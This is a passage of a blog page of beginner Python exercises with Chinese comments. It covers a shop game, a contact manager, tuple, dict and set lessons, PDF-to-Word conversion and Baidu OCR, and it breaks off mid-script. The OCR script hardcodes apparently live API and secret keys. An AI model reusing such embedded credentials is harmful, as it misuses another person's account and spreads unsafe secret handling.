class=\"line\">\t\t\t\t\t\t\tcoins += weapon[1]</span><br><span class=\"line\">\t\t\t\t\t\t\tbreak</span><br><span class=\"line\"></span><br><span class=\"line\">\t\t\t\t\tbreak</span><br><span class=\"line\">\t\t\t\telse:</span><br><span class=\"line\">\t\t\t\t\tprint(&#x27;weaponname input error!&#x27;)</span><br><span class=\"line\"></span><br><span class=\"line\">\t\telse:</span><br><span class=\"line\">\t\t\tprint(&#x27;It doesn\\&#x27;t make any sense to say heavy if you don\\&#x27;t have a weapon!\\</span><br><span class=\"line\">Please hurry to buy a weapon!&#x27;)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">\telif choice==4:</span><br><span class=\"line\">\t\tprint(&#x27;&#123;&#125; has following weapons:&#x27;.format(role))</span><br><span class=\"line\">\t\tfor weapon in weapon_list:</span><br><span class=\"line\">\t\t\tprint(weapon)</span><br><span class=\"line\">\t\t# check coins</span><br><span class=\"line\">\t\tprint(&#x27;Total coins:&#x27;,coins)</span><br><span class=\"line\"></span><br><span class=\"line\">\telif choice==5:</span><br><span class=\"line\">\t\tanswer = input(&#x27;Are you sure exiting the game? Y/N: &#x27;)</span><br><span class=\"line\">\t\tif answer==&#x27;Y&#x27;:</span><br><span class=\"line\">\t\t\tprint(&#x27;Game over!!!&#x27;)</span><br><span class=\"line\">\t\t\tbreak</span><br><span class=\"line\">\telse:</span><br><span class=\"line\">\t\tprint(&#x27;input error, please input again&#x27;)</span><br></pre></td></tr></table></figure>\n\n<h1 id=\"contactmanagesystem-py\"><a href=\"#contactmanagesystem-py\" class=\"headerlink\" title=\"contactmanagesystem.py\"></a>contactmanagesystem.py</h1><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">print(&#x27;#&#x27;*50)</span><br><span class=\"line\">print(&#x27;welcome to contact manage system!&#x27;)</span><br><span class=\"line\">print(&#x27;#&#x27;*50)</span><br><span class=\"line\"></span><br><span class=\"line\">list1 = []</span><br><span class=\"line\">list2 = []</span><br><span class=\"line\"></span><br><span class=\"line\">while True:</span><br><span class=\"line\">\tprint(&#x27;&#x27;)</span><br><span class=\"line\">\tprint(&#x27;=&#x27;*10,&#x27;contact manage system&#x27;,&#x27;=&#x27;*10)</span><br><span class=\"line\">\tprint(&#x27;1.add name and phone number\\n2.delete name\\n\\</span><br><span class=\"line\">3.modify phone number\\n4.query all users\\n5.find a phone number by name\\n6.exit&#x27;)</span><br><span class=\"line\">\tprint(&#x27;=&#x27;*10,&#x27;contact manage system&#x27;,&#x27;=&#x27;*10)</span><br><span class=\"line\">\tnum1 = int(input(&#x27;please select a func: &#x27;))</span><br><span class=\"line\"></span><br><span class=\"line\">\tif num1 == 1:</span><br><span class=\"line\">\t\tname = input(&#x27;please input a name: &#x27;)</span><br><span class=\"line\">\t\tnumber = input(&#x27;please input a phone number: &#x27;)</span><br><span class=\"line\">\t\tif len(list1) == 0:</span><br><span class=\"line\">\t\t\tlist1.append([name,number])</span><br><span class=\"line\">\t\t\tprint(list1)</span><br><span class=\"line\">\t\telse:</span><br><span class=\"line\">\t\t\tfor user in list1:</span><br><span class=\"line\">\t\t\t\tif name in user:</span><br><span class=\"line\">\t\t\t\t\tanswer1 = input(&#x27;The user is already exist, \\</span><br><span class=\"line\">do you want to add a new phone number for him/her?(Y/N): &#x27;)</span><br><span class=\"line\">\t\t\t\t\tif answer1 == &#x27;Y&#x27;:</span><br><span class=\"line\">\t\t\t\t\t\tuser.append(number)</span><br><span class=\"line\">\t\t\t\t\t\tprint(list1)</span><br><span class=\"line\">\t\t\t\t\t\tbreak</span><br><span class=\"line\">\t\t\t\t\telse:</span><br><span class=\"line\">\t\t\t\t\t\tprint(list1)</span><br><span class=\"line\">\t\t\t\t\t\tbreak</span><br><span class=\"line\">\t\t\telse:</span><br><span class=\"line\">\t\t\t\tlist1.append([name,number])</span><br><span class=\"line\">\t\t\t\tprint(list1)</span><br><span class=\"line\"></span><br><span class=\"line\">\tif num1 == 2:</span><br><span class=\"line\">\t\tname = input(&#x27;please input the name you want to delete: &#x27;)</span><br><span class=\"line\">\t\tfor user in list1:</span><br><span class=\"line\">\t\t\tif name in user:</span><br><span class=\"line\">\t\t\t\tlist1.remove(user)</span><br><span class=\"line\">\t\t\t\tprint(list1)</span><br><span class=\"line\">\t\t\t\tbreak</span><br><span class=\"line\"></span><br><span class=\"line\">\t\telse:</span><br><span class=\"line\">\t\t\tprint(&#x27;the name you input is not exist&#x27;)</span><br><span class=\"line\">\t\t\tprint(list1)</span><br><span class=\"line\"></span><br><span class=\"line\">\tif num1 == 3:</span><br><span class=\"line\">\t\tname = input(&#x27;please input the name you want to modify: &#x27;)</span><br><span class=\"line\">\t\tfor user in list1:</span><br><span class=\"line\">\t\t\tif name in user:</span><br><span class=\"line\">\t\t\t\tprint(&#x27;This user has following phone numbers: &#x27;)</span><br><span class=\"line\">\t\t\t\tfor i in range(len(user)-1):</span><br><span class=\"line\">\t\t\t\t\tprint(&#x27;NO.&#123;&#125;:&#123;&#125;&#x27;.format(i+1,user[i+1]))</span><br><span class=\"line\">\t\t\t\twhile True:</span><br><span class=\"line\">\t\t\t\t\tindex = int(input(&#x27;please input the NO. you want to modify: &#x27;))</span><br><span class=\"line\">\t\t\t\t\tif index &lt;= len(user):</span><br><span class=\"line\">\t\t\t\t\t\tuser[index] = input(&#x27;please input a new number: &#x27;)</span><br><span class=\"line\">\t\t\t\t\t\tprint(list1)</span><br><span class=\"line\">\t\t\t\t\t\tbreak</span><br><span class=\"line\">\t\t\t\t\telse:</span><br><span class=\"line\">\t\t\t\t\t\tprint(&#x27;The NO. you input is wrong, please input again&#x27;)</span><br><span class=\"line\"></span><br><span class=\"line\">\t\t\t\tbreak</span><br><span class=\"line\"></span><br><span class=\"line\">\t\telse:</span><br><span class=\"line\">\t\t\tprint(&#x27;the name you input is not exist&#x27;)</span><br><span class=\"line\">\t\t\tprint(list1)</span><br><span class=\"line\"></span><br><span class=\"line\">\tif num1 == 4:</span><br><span class=\"line\">\t\tprint(&#x27;name\\tmunber1\\tnumber2\\t........&#x27;)</span><br><span class=\"line\">\t\tfor user in list1:</span><br><span class=\"line\">\t\t\tfor i in user:</span><br><span class=\"line\">\t\t\t\tprint(i,end=&#x27;\\t&#x27;)</span><br><span class=\"line\"></span><br><span class=\"line\">\t\t\tprint(&#x27;&#x27;)</span><br><span class=\"line\"></span><br><span class=\"line\">\tif num1 == 5:</span><br><span class=\"line\">\t\tname = input(&#x27;please input the name you want to query: &#x27;)</span><br><span class=\"line\">\t\tfor user in list1:</span><br><span class=\"line\">\t\t\tif name in user:</span><br><span class=\"line\">\t\t\t\tprint(user)</span><br><span class=\"line\">\t\t\t\tbreak</span><br><span class=\"line\"></span><br><span class=\"line\">\t\telse:</span><br><span class=\"line\">\t\t\tprint(&#x27;the name you input is not exist&#x27;)</span><br><span class=\"line\"></span><br><span class=\"line\">\tif num1 == 6:</span><br><span class=\"line\">\t\tprint(&#x27;you are exiting the system...&#x27;)</span><br><span class=\"line\">\t\tbreak</span><br></pre></td></tr></table></figure>\n\n<h1 id=\"tuple01-py\"><a href=\"#tuple01-py\" class=\"headerlink\" title=\"tuple01.py\"></a>tuple01.py</h1><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">&#x27;&#x27;&#x27;</span><br><span class=\"line\">元组：</span><br><span class=\"line\"></span><br><span class=\"line\">类似列表（当成容器）</span><br><span class=\"line\">特点：</span><br><span class=\"line\">1.定义符号：（）</span><br><span class=\"line\">2.元组中的内容不可修改</span><br><span class=\"line\">3.关键字：tuple</span><br><span class=\"line\"></span><br><span class=\"line\">&#x27;&#x27;&#x27;</span><br><span class=\"line\"></span><br><span class=\"line\">import random</span><br><span class=\"line\"></span><br><span class=\"line\">list1 = []</span><br><span class=\"line\">for i in range(10):</span><br><span class=\"line\">\tran  = random.randint(1,20)</span><br><span class=\"line\">\tlist1.append(ran)</span><br><span class=\"line\"></span><br><span class=\"line\">t1 = tuple(list1)</span><br><span class=\"line\">print(t1)</span><br><span class=\"line\"></span><br><span class=\"line\">print(t1[::-1])</span><br><span class=\"line\"></span><br><span class=\"line\"># 运算函数：max(), min(), sum(), len(),  sorted(t1)--返回列表类型</span><br><span class=\"line\"></span><br><span class=\"line\"># 元组中的函数: t1.index(), t1.count()</span><br><span class=\"line\"></span><br><span class=\"line\"># 拆包</span><br><span class=\"line\"></span><br><span class=\"line\">t2 = (4,7,3)</span><br><span class=\"line\"></span><br><span class=\"line\">a,b,c = t2</span><br><span class=\"line\">print(a,b,c)</span><br><span class=\"line\"></span><br><span class=\"line\">a = t2</span><br><span class=\"line\">print(a)</span><br><span class=\"line\"></span><br><span class=\"line\"># 变量个数与元组中元素个数不一致</span><br><span class=\"line\"></span><br><span class=\"line\">t1 = (2,5,8,9,7)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"># 装包： *变量=t1  装进列表</span><br><span class=\"line\">a,*_,c = t1</span><br><span class=\"line\">print(a,c,_)</span><br><span class=\"line\"></span><br><span class=\"line\">a,c,*_ = t1</span><br><span class=\"line\">print(a,c,_)</span><br><span class=\"line\"></span><br><span class=\"line\">a,b,*c = t1</span><br><span class=\"line\">print(a,b,c)</span><br><span class=\"line\"></span><br><span class=\"line\">t1=(9,)</span><br><span class=\"line\">a,*b = t1</span><br><span class=\"line\">print(a,b) # *b 表示未知个数0~n，多个元素的话全部放在一个列表[1,2,3....]</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">t1=(9,4,8,6)</span><br><span class=\"line\">a,*b = t1 # 赋值时散列数据，用星号*是装包</span><br><span class=\"line\">print(b) # [4, 8, 6]</span><br><span class=\"line\">print(*b) # 4 8 6</span><br><span class=\"line\">print(*[4,8,6]) # 已经装包好的数据，用星号*是拆包</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">&#x27;&#x27;&#x27;</span><br><span class=\"line\">运算符号：</span><br><span class=\"line\">+</span><br><span class=\"line\">*</span><br><span class=\"line\">is  not</span><br><span class=\"line\">in  not in</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">&#x27;&#x27;&#x27;</span><br><span class=\"line\"></span><br><span class=\"line\">t2 = (4,5)+(1,2)</span><br><span class=\"line\">print(t2)</span><br><span class=\"line\"></span><br><span class=\"line\">t3 = (3,4)*2</span><br><span class=\"line\">print(t3)</span><br><span class=\"line\"></span><br><span class=\"line\">print(t2 is t3)</span><br><span class=\"line\"></span><br><span class=\"line\">print(3 in t3)</span><br><span class=\"line\"></span><br><span class=\"line\">print(tuple(sorted(t2)))</span><br></pre></td></tr></table></figure>\n\n<h1 id=\"dict01-py\"><a href=\"#dict01-py\" class=\"headerlink\" title=\"dict01.py\"></a>dict01.py</h1><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">&#x27;&#x27;&#x27;</span><br><span class=\"line\">应用：</span><br><span class=\"line\">貂蝉 --- [&#x27;屠龙刀&#x27;,&#x27;手榴弹&#x27;]  800</span><br><span class=\"line\">诸葛亮 --- [&#x27;鹅毛扇&#x27;,&#x27;碧血剑&#x27;,&#x27;98K&#x27;] 300</span><br><span class=\"line\"></span><br><span class=\"line\">特点：</span><br><span class=\"line\">1.符号：&#123;&#125;</span><br><span class=\"line\">2.关键字：dict</span><br><span class=\"line\">3.保存的元素是：key: value --键值对</span><br><span class=\"line\"></span><br><span class=\"line\">&#x27;&#x27;&#x27;</span><br><span class=\"line\"># dict1 = dict((&#x27;name&#x27;,&#x27;lucky&#x27;)) # ValueError: dictionary update sequence element #0 has length 4; 2 is required</span><br><span class=\"line\"></span><br><span class=\"line\">dict1 = dict([(&#x27;name&#x27;,&#x27;lucky&#x27;),(&#x27;age&#x27;,18)])</span><br><span class=\"line\"></span><br><span class=\"line\">print(dict1)</span><br><span class=\"line\"></span><br><span class=\"line\"># dict2 = dict([(1,2,3),(4,5),(6,8),(9,0)]) # ValueError: dictionary update sequence element #0 has length 3; 2 is required</span><br><span class=\"line\"></span><br><span class=\"line\"># 注意： list可以转成字典，前提是列表中的元素都要成对出现</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">&#x27;&#x27;&#x27;</span><br><span class=\"line\">案例：</span><br><span class=\"line\">用户注册功能</span><br><span class=\"line\">username</span><br><span class=\"line\">password</span><br><span class=\"line\">email</span><br><span class=\"line\">phone</span><br><span class=\"line\"></span><br><span class=\"line\">&#x27;&#x27;&#x27;</span><br><span class=\"line\"></span><br><span class=\"line\"># print(&#x27;------------welcome to user registry page of zhilian hire website--------------&#x27;)</span><br><span class=\"line\"></span><br><span class=\"line\"># database = []</span><br><span class=\"line\"></span><br><span class=\"line\"># while True:</span><br><span class=\"line\">\t</span><br><span class=\"line\"># \tusername = input(&#x27;please input a username: &#x27;)</span><br><span class=\"line\"># \tpassword = input(&#x27;please input a password: &#x27;)</span><br><span class=\"line\"># \trepassword = input(&#x27;please input confirm password: &#x27;)</span><br><span class=\"line\"># \temail = input(&#x27;please input a email: &#x27;)</span><br><span class=\"line\"># \tphone = input(&#x27;please input a phone number: &#x27;)</span><br><span class=\"line\"></span><br><span class=\"line\"># \t# 定义一个字典</span><br><span class=\"line\"># \tuser=&#123;&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"># \t# 将信息保存到字典中</span><br><span class=\"line\"># \tuser[&#x27;username&#x27;]=username</span><br><span class=\"line\"># \tif password == repassword:</span><br><span class=\"line\"># \t\tuser[&#x27;password&#x27;]=password</span><br><span class=\"line\"># \telse:</span><br><span class=\"line\"># \t\tprint(&#x27;Confirm password is different with password, please input your info again&#x27;)</span><br><span class=\"line\"># \t\tcontinue</span><br><span class=\"line\"></span><br><span class=\"line\"># \tuser[&#x27;email&#x27;]=email</span><br><span class=\"line\"># \tuser[&#x27;phone&#x27;]=phone</span><br><span class=\"line\"></span><br><span class=\"line\"># \t# 保存到数据库</span><br><span class=\"line\"># \tdatabase.append(user)</span><br><span class=\"line\"></span><br><span class=\"line\"># \tanswer = input(&#x27;Do you want to continue to registrate?(y/n): &#x27;)</span><br><span class=\"line\"></span><br><span class=\"line\"># \tif answer != &#x27;y&#x27;:</span><br><span class=\"line\"># \t\tbreak</span><br><span class=\"line\"></span><br><span class=\"line\"># print(database)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"># 字典内置函数： dict.keys()--取出字典中所有的key键，保存到列表中</span><br><span class=\"line\"># dict.values()--取出字典所有的值，保存到列表中</span><br><span class=\"line\"># dict.items()--将字典的键值对转成列表保存的形式[(key,value),(key,value),(key,value)]</span><br><span class=\"line\"></span><br><span class=\"line\"># 判断： key in dict, value in dict</span><br><span class=\"line\"></span><br><span class=\"line\"># dict.get(&#x27;key&#x27;,&#x27;value--default&#x27;)--value若能取到值则返回字典中的值，否则返回default的值</span><br><span class=\"line\"></span><br><span class=\"line\"># 字典的内置函数：删除</span><br><span class=\"line\"># dict1.remove() 不存在则报错</span><br><span class=\"line\"># dict.pop(key[,default]) ----&gt; 根据key删除字典中的键值对，返回值：删除成功则返回键值对的值value。</span><br><span class=\"line\">#\t\t\t\t\t\t\t\tpop的默认值，往往是在删除的时候没有找到对应的key，此时就返回default值</span><br><span class=\"line\"></span><br><span class=\"line\">dict1 = &#123;&#x27;zhangsan&#x27;:100,&#x27;lisi&#x27;:100,&#x27;wangwu&#x27;:100,&#x27;zhaoliu&#x27;:100&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">result = dict1.pop(&#x27;lisi&#x27;,&#x27;80&#x27;)</span><br><span class=\"line\">print(result)</span><br><span class=\"line\">result = dict1.pop(&#x27;zhangxiaosan&#x27;,&#x27;There is no such key&#x27;)</span><br><span class=\"line\">print(result)</span><br><span class=\"line\">print(dict1)</span><br><span class=\"line\"></span><br><span class=\"line\"># popitem():随机删除字典中键值对（一般是从末尾删除元素）</span><br><span class=\"line\">dict1 = &#123;&#x27;zhangsan&#x27;:100,&#x27;lisi&#x27;:100,&#x27;wangwu&#x27;:100,&#x27;zhaoliu&#x27;:100&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">result = dict1.popitem()</span><br><span class=\"line\">print(result)</span><br><span class=\"line\">print(dict1)</span><br><span class=\"line\"></span><br><span class=\"line\"># clear() 删除全部</span><br><span class=\"line\"></span><br><span class=\"line\"># update() 类似列表 []+[] 合并操作，但字典不支持‘+’</span><br><span class=\"line\"></span><br><span class=\"line\">dict1 = &#123;0:&#x27;tom&#x27;,1:&#x27;jack&#x27;,2:&#x27;lucy&#x27;&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">dict2 = &#123;0:&#x27;lily&#x27;,&#x27;4&#x27;:&#x27;ruby&#x27;&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">result = dict1.update(dict2)</span><br><span class=\"line\">print(result)</span><br><span class=\"line\">print(dict1)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"># fromkeys(seq,default)----将seq转成字典的形式，若没有指定默认的value则用None</span><br><span class=\"line\">#\t\t\t\t\t\t\t&#123;&#x27;aa&#x27;: None, &#x27;bb&#x27;: None, &#x27;cc&#x27;: None&#125;</span><br><span class=\"line\">#\t\t\t\t\t\t\t如果指定default，则用default替代None这个value值</span><br><span class=\"line\">#\t\t\t\t\t\t\t&#123;&#x27;aa&#x27;: 10, &#x27;bb&#x27;: 10, &#x27;cc&#x27;: 10&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">list1 = [&#x27;aa&#x27;,&#x27;bb&#x27;,&#x27;cc&#x27;]</span><br><span class=\"line\">new_dict = dict.fromkeys(list1,10) # &#123;&#x27;aa&#x27;: 10, &#x27;bb&#x27;: 10, &#x27;cc&#x27;: 10&#125;</span><br><span class=\"line\"># new_dict = dict.fromkeys(list1) -- &#123;&#x27;aa&#x27;: None, &#x27;bb&#x27;: None, &#x27;cc&#x27;: None&#125;</span><br><span class=\"line\">print(new_dict)</span><br></pre></td></tr></table></figure>\n\n<h1 id=\"类型转换-py\"><a href=\"#类型转换-py\" class=\"headerlink\" title=\"类型转换.py\"></a>类型转换.py</h1><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\"># 类型转换</span><br><span class=\"line\"># str()  int()  list()  dict()  set()  tuple()</span><br><span class=\"line\"></span><br><span class=\"line\"># str &lt;--&gt; int,list,set,tuple,dict,float 可互相转换</span><br><span class=\"line\"></span><br><span class=\"line\"># list ---&gt; set,tuple,可转成字典[(key:value),(key:value),...]</span><br><span class=\"line\"></span><br><span class=\"line\"># tuple ---&gt; list,  set ---&gt; list,  dict --&gt; list(只存放key)</span><br></pre></td></tr></table></figure>\n\n<h1 id=\"set01-py\"><a href=\"#set01-py\" class=\"headerlink\" title=\"set01.py\"></a>set01.py</h1><p><img src=\"/set.jpg\"></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\"># 集合有不重复的特点</span><br><span class=\"line\"></span><br><span class=\"line\">s1 = set() # 创建空集合，其他类型转换成集合可去重</span><br><span class=\"line\">s2 = &#123;&#125; # 创建空字典</span><br><span class=\"line\"></span><br><span class=\"line\"># 增加： add(), update()</span><br><span class=\"line\"></span><br><span class=\"line\"># 删除： remove(), discard(), pop(), clear()</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">&#x27;&#x27;&#x27;</span><br><span class=\"line\"># 符号操作</span><br><span class=\"line\">in  ==  </span><br><span class=\"line\">[+  *]不支持</span><br><span class=\"line\">-</span><br><span class=\"line\">&amp;</span><br><span class=\"line\">|</span><br><span class=\"line\"></span><br><span class=\"line\">&#x27;&#x27;&#x27;</span><br><span class=\"line\"></span><br><span class=\"line\">set2 = &#123;2,3,4,5,6&#125;</span><br><span class=\"line\">set3 = &#123;2,3,4,5,6,7,8&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">set4 = set3-set2  # 差集 difference()</span><br><span class=\"line\">print(set4)</span><br><span class=\"line\"></span><br><span class=\"line\">set5 = set2 - set3</span><br><span class=\"line\">print(set5)</span><br><span class=\"line\"></span><br><span class=\"line\">set6 = set3.difference(set2)</span><br><span class=\"line\">print(set6)</span><br><span class=\"line\"></span><br><span class=\"line\">#  &amp; 交集  intersection()</span><br><span class=\"line\">set7 = set3 &amp; set2</span><br><span class=\"line\">print(set7)</span><br><span class=\"line\"></span><br><span class=\"line\">set7 = set3.intersection(set2)</span><br><span class=\"line\">print(set7)</span><br><span class=\"line\"></span><br><span class=\"line\">#  | 并集  union()</span><br><span class=\"line\">set8 = set3 | set2</span><br><span class=\"line\">print(set8)</span><br><span class=\"line\"></span><br><span class=\"line\">set8 = set3.union(set2)</span><br><span class=\"line\">print(set8)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">&#x27;&#x27;&#x27;</span><br><span class=\"line\">已知两个列表：</span><br><span class=\"line\">l1 = [5,1,2,9,0,3]</span><br><span class=\"line\">l2 = [7,2,5,7,9]</span><br><span class=\"line\">找出两个列表的不同元素</span><br><span class=\"line\">找出两个列表的共同元素</span><br><span class=\"line\"></span><br><span class=\"line\">&#x27;&#x27;&#x27;</span><br><span class=\"line\"></span><br><span class=\"line\">l1 = [5,1,2,9,0,3]</span><br><span class=\"line\">l2 = [7,2,5,7,9]</span><br><span class=\"line\"></span><br><span class=\"line\">s1 = set(l1)</span><br><span class=\"line\">s2 = set(l2)</span><br><span class=\"line\"></span><br><span class=\"line\"># 对称差集--找出不同元素</span><br><span class=\"line\"></span><br><span class=\"line\"># 方法一</span><br><span class=\"line\">result = (s1 | s2) - (s1 &amp; s2)</span><br><span class=\"line\">print(result)</span><br><span class=\"line\"></span><br><span class=\"line\"># 方法二</span><br><span class=\"line\">result = s1 ^ s2  # symmetric_different()--对称差集</span><br><span class=\"line\">print(result)</span><br><span class=\"line\"></span><br><span class=\"line\"># 并集--找出共同元素</span><br><span class=\"line\"></span><br><span class=\"line\">&#x27;&#x27;&#x27;</span><br><span class=\"line\">difference_update() 找出差集并赋值</span><br><span class=\"line\"></span><br><span class=\"line\">intersection_update() 交集并赋值</span><br><span class=\"line\"></span><br><span class=\"line\">union_update() 并集并赋值</span><br><span class=\"line\"></span><br><span class=\"line\">symmetric_different_update() 对称差集并赋值</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">&#x27;&#x27;&#x27;</span><br><span class=\"line\">s1.difference_update(s2)</span><br><span class=\"line\">print(s1)</span><br></pre></td></tr></table></figure>\n\n<h1 id=\"PDF-TO-WORD-py\"><a href=\"#PDF-TO-WORD-py\" class=\"headerlink\" title=\"PDF_TO_WORD.py\"></a>PDF_TO_WORD.py</h1><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">from pdfminer.pdfparser import PDFParser, PDFDocument</span><br><span class=\"line\">from pdfminer.pdfinterp import PDFResourceManager, PDFPageInterpreter</span><br><span class=\"line\">from pdfminer.layout import LAParams</span><br><span class=\"line\">from pdfminer.converter import PDFPageAggregator</span><br><span class=\"line\">from pdfminer.pdfinterp import PDFTextExtractionNotAllowed</span><br><span class=\"line\">from docx import Document</span><br><span class=\"line\"></span><br><span class=\"line\">document = Document()</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">def parse():</span><br><span class=\"line\">    # rb以二进制读模式打开本地pdf文件</span><br><span class=\"line\">    fn = open(&#x27;navicat.pdf&#x27;, &#x27;rb&#x27;)</span><br><span class=\"line\">    # 创建一个pdf文档分析器</span><br><span class=\"line\">    parser = PDFParser(fn)</span><br><span class=\"line\">    # 创建一个PDF文档</span><br><span class=\"line\">    doc = PDFDocument()</span><br><span class=\"line\">    # 连接分析器 与文档对象</span><br><span class=\"line\">    parser.set_document(doc)</span><br><span class=\"line\">    doc.set_parser(parser)</span><br><span class=\"line\"></span><br><span class=\"line\">    # 提供初始化密码doc.initialize(&quot;lianxipython&quot;)</span><br><span class=\"line\">    # 如果没有密码 就创建一个空的字符串</span><br><span class=\"line\">    doc.initialize(&quot; &quot;)</span><br><span class=\"line\">    # 检测文档是否提供txt转换，不提供就忽略</span><br><span class=\"line\">    if not doc.is_extractable:</span><br><span class=\"line\">        raise PDFTextExtractionNotAllowed</span><br><span class=\"line\"></span><br><span class=\"line\">    else:</span><br><span class=\"line\">        # 创建PDf资源管理器</span><br><span class=\"line\">        resource = PDFResourceManager()</span><br><span class=\"line\">        # 创建一个PDF参数分析器</span><br><span class=\"line\">        laparams = LAParams()</span><br><span class=\"line\">        # 创建聚合器,用于读取文档的对象</span><br><span class=\"line\">        device = PDFPageAggregator(resource, laparams=laparams)</span><br><span class=\"line\">        # 创建解释器，对文档编码，解释成Python能够识别的格式</span><br><span class=\"line\">        interpreter = PDFPageInterpreter(resource, device)</span><br><span class=\"line\">        # 循环遍历列表，每次处理一页的内容</span><br><span class=\"line\">        # doc.get_pages() 获取page列表</span><br><span class=\"line\">        for page in doc.get_pages():</span><br><span class=\"line\">            # 利用解释器的process_page()方法解析读取单独页数</span><br><span class=\"line\">            interpreter.process_page(page)</span><br><span class=\"line\">            # 使用聚合器get_result()方法获取内容</span><br><span class=\"line\">            layout = device.get_result()</span><br><span class=\"line\">            # 这里layout是一个LTPage对象,里面存放着这个page解析出的各种对象</span><br><span class=\"line\">            for out in layout:</span><br><span class=\"line\">                # 判断是否含有get_text()方法，获取我们想要的文字</span><br><span class=\"line\">                if hasattr(out, &quot;get_text&quot;):</span><br><span class=\"line\">                    # print(out.get_text(), type(out.get_text()))</span><br><span class=\"line\">                    content = out.get_text().replace(u&#x27;\\xa0&#x27;, u&#x27; &#x27;)  # 将&#x27;\\xa0&#x27;替换成u&#x27; &#x27;空格，这个\\xa0就是&amp;nbps空格</span><br><span class=\"line\">                    # with open(&#x27;test.txt&#x27;,&#x27;a&#x27;) as f:</span><br><span class=\"line\">                    #     f.write(out.get_text().replace(u&#x27;\\xa0&#x27;, u&#x27; &#x27;)+&#x27;\\n&#x27;)</span><br><span class=\"line\">                    document.add_paragraph(</span><br><span class=\"line\">                        content, style=&#x27;List&#x27;  # 添加段落，样式为unordered list类型</span><br><span class=\"line\">                    )</span><br><span class=\"line\">                document.save(&#x27;Final_result.docx&#x27;)  # 保存这个文档</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">if __name__ == &#x27;__main__&#x27;:</span><br><span class=\"line\">    parse()</span><br></pre></td></tr></table></figure>\n\n<h1 id=\"PictureToText-py\"><a href=\"#PictureToText-py\" class=\"headerlink\" title=\"PictureToText.py\"></a>PictureToText.py</h1><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\">from aip import AipOcr  # 百度OCR API</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">&quot;&quot;&quot; 你的 APPID AK SK &quot;&quot;&quot;</span><br><span class=\"line\">APP_ID = &#x27;23564063&#x27;</span><br><span class=\"line\">API_KEY = &#x27;LXzNPBTFspP4G078ckg1IRNR&#x27;</span><br><span class=\"line\">SECRET_KEY = &#x27;grUtbwfub20E9kp3ShFWCBOshMqcKeuI&#x27;</span><br><span class=\"line\"></span><br><span class=\"line\">client = AipOcr(APP_ID, API_KEY, SECRET_KEY)</span><br><span class=\"line\"></span><br><span class=\"line\">&quot;&quot;&quot; 读取图片 &quot;&quot;&quot;</span><br><span class=\"line\">def get_file_content(filePath):</span><br><span class=\"line\">    with open(filePath, &#x27;rb&#x27;) as fp:</span><br><span class=\"line\">        return fp.read()</span><br><span class=\"line\"></span><br><span class=\"line\">&quot;&quot;&quot; 从API的返回字典中获取文字 &quot;&quot;&quot;</span><br><span class=\"line\">def getOcrText(txt_dict):</span><br><span class=\"line\">\ttxt = &quot;&quot;</span><br><span class=\"line\">\tif type(txt_dict) == dict:</span><br><span class=\"line\">\t\tfor i in txt_dict[&#x27;words_result&#x27;]:</span><br><span class=\"line\">\t\t\ttxt = txt + i[&quot;words&quot;]</span><br><span class=\"line\">\t\t\tif len(i[&quot;words&quot;]) &lt; 25: # 这里使用字符串长度决定了文本是否换行，读者可以根据自己的喜好控制回车符的输出，实现可控的文本显示形式</span><br><span class=\"line\">\t\t\t\ttxt = txt + &quot;\\n\\n&quot;</span><br><span class=\"line\">\treturn txt</span><br><span class=\"line\"></span><br><span class=\"line\">&quot;&quot;&quot; 调用通用/高精度文字识别, 图片参数为本地图片 &quot;&quot;&quot;</span><br><span class=\"line\">def BaiduOcr(imageName,Accurate=True):</span><br><span class=\"line\">\timage = get_file_content(imageName)</span><br><span class=\"line\">\tif Accurate:</span><br><span class=\"line\">\t\treturn getOcrText(client.basicGeneral(image))</span><br><span class=\"line\">\telse:</span><br><span class=\"line\">\t\treturn getOcrText(client.basicAccurate(image))</span><br><span class=\"line\"></span><br><span class=\"line\">result = BaiduOcr(&quot;1622959742576931700.png&quot;)</span><br><span class=\"line\">print(result)</span><br></pre></td></tr></table></figure>\n\n<h1 id=\"PDFToPicture-py\"><a href=\"#PDFToPicture-py\" class=\"headerlink\" title=\"PDFToPicture.py\"></a>PDFToPicture.py</h1><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">import datetime</span><br><span class=\"line\">import os</span><br><span class=\"line\"></span><br><span class=\"line\">import fitz  # fitz就是pip install PyMuPDF</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">def pyMuPDF_fitz(pdfPath, imagePath):</span><br><span class=\"line\">    startTime_pdf2img = 